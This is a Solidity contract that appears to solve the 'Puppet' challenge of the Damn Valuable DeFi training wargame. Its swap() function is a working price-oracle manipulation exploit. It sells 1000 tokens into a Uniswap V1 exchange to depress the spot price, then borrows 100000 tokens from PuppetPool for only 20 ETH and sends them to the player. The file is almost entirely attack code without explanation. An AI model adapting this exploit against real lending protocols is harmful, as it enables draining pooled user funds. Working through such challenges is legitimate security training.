// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

interface IUniswapV1Exchange {
    function getInputPrice(
        uint256 input_amount,
        uint256 input_reserve,
        uint256 output_reserve
    ) external view returns (uint256);

    function getOutputPrice(
        uint256 output_amount,
        uint256 input_reserve,
        uint256 output_reserve
    ) external view returns (uint256);

    function ethToTokenSwapInput(
        uint256 min_tokens,
        uint256 deadline
    ) external payable returns (uint256);

    function ethToTokenSwapOutput(
        uint256 tokens_bought,
        uint256 deadline
    ) external payable returns (uint256);

    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);
}

contract PuppetAttack {
    uint256 amount1 = 1000 ether;
    uint256 amount2 = 100000 ether;

    PuppetPool public pool;
    DamnValuableToken public token;
    IUniswapV1Exchange public exchange;
    address public player;
    uint256 public count;

    constructor(
        address _exchange,
        address _pool,
        address _token,
        address _player
    ) payable {
        exchange = IUniswapV1Exchange(_exchange);
        pool = PuppetPool(_pool);
        token = DamnValuableToken(_token);
        player = _player;
    }

    function swap() public {
        token.approve(address(exchange), amount1);
        exchange.tokenToEthSwapInput(amount1, 1, block.timestamp + 5000);
        pool.borrow{value: 20 ether, gas: 1000000}(amount2, player);
    }

    receive() external payable {}
}
